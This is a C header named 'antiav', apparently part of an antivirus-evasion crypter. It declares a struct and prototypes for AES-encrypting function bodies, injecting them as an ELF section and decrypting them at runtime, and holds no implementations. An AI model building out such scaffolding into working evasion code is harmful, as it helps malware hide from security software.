#ifndef ANTIAV_H
#define ANTIAV_H

#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <time.h>

#include "elf_inject.h"
#include "aes.h"

struct crypter_functions {
  void *function;
  char *buff;
  int size;
  char *key;
  char *iv;
};

size_t function_size(void *);

void crypter_set_function(void *);
void crypter_init(char *);
int is_encrypted(void *);
void rewrite_function(char *, struct crypter_functions *, int);
char *read_and_encrypt(void *, char *, char *);
int add_as_section(char *, struct crypter_functions *);
void decrypt_and_copy_functions(struct crypter_functions *);
uint8_t *encrypt_function(uint8_t *, int, uint8_t *, uint8_t *);
uint8_t *decrypt_function(uint8_t *, int, uint8_t *, uint8_t *);

#endif
